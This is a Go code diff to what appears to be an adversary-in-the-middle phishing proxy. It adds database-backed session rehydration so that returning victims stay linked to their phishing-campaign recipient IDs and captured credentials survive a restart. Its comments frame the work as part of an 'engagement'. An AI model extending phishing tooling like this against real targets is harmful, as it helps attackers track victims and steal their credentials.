@@ -202,6 +202,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
+	// Repopulate session identity correlation (session id, RID, phishlet)
+	// from whatever the database persisted across a restart. A failure here
+	// degrades gracefully to the pre-rehydration behavior (empty maps)
+	// rather than blocking proxy startup.
+	if err := p.rehydrateSessions(); err != nil {
+		log.Error("failed to rehydrate sessions from database: %v", err)
+	}
+
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -550,6 +558,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
 										log.Error("database: %v", err)
+									}
+									if session.RId != "" {
+										// Persist the RID->session correlation so a victim who returns
+										// after a proxy restart is still attributed to their campaign
+										// recipient (see HttpProxy.rehydrateSessions).
+										if err := p.db.SetSessionRID(session.Id, session.RId); err != nil {
+											log.Error("database: %v", err)
+										}
 									}
 
 									session.RedirectURL = pl.RedirectUrl
@@ -2144,6 +2160,66 @@ func (p *HttpProxy) addSession(session *Session) int {
 	p.sids[session.Id] = sid
 	p.session_mtx.Unlock()
 	return sid
+}
+
+// rehydrateSessions repopulates p.sessions and p.sids from whatever the
+// database already persisted, so a victim who returns after an olta-proxy
+// restart is still correlated to their campaign recipient (RID) and
+// phishlet - the in-memory maps this restores from are otherwise empty
+// after a restart, which silently drops that attribution even though the
+// captures themselves keep working.
+//
+// Scope is deliberately narrow: only identity correlation (session id,
+// RID, phishlet) is restored. Live ceremony state - DoneSignal,
+// ProgressIndex, IsCaptchaDone, mid-flight OAuth state - is NOT
+// resurrected; a rehydrated session looks exactly like a session
+// NewSession() just created, except its id, name and RId are overwritten
+// to match the persisted record. A victim who re-authenticates after a
+// restart is a normal outcome and yields a fresh capture; what actually
+// costs the engagement is losing the RID link, which this restores.
+//
+// The database has no session-level expiry or completion flag today
+// (sessionsList/loadSessions apply none - see db_session.go); the store's
+// only "expiry" is an operator explicitly deleting a session, at which
+// point ListSessions no longer returns it. So every session the store
+// still holds is rehydrated; inventing an additional filter here would be
+// exactly the kind of policy this task was told not to invent.
+//
+// last_sid mirrors the same de-duplication loadSessions already applies to
+// the database's own nextSessionID counter: each restored session keeps
+// the numeric id BuntDB assigned it (ds.Id) as its p.sids index, and
+// last_sid is set one past the highest id seen, so a freshly assigned
+// session can never collide with a rehydrated one.
+func (p *HttpProxy) rehydrateSessions() error {
+	if p.db == nil {
+		return nil
+	}
+	stored, err := p.db.ListSessions()
+	if err != nil {
+		return err
+	}
+
+	p.session_mtx.Lock()
+	defer p.session_mtx.Unlock()
+
+	for _, ds := range stored {
+		if ds == nil || ds.SessionId == "" {
+			continue
+		}
+		s, err := NewSession(ds.Phishlet)
+		if err != nil {
+			return err
+		}
+		s.Id = ds.SessionId
+		s.RId = ds.RId
+
+		p.sessions[s.Id] = s
+		p.sids[s.Id] = ds.Id
+		if ds.Id >= p.last_sid {
+			p.last_sid = ds.Id + 1
+		}
+	}
+	return nil
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
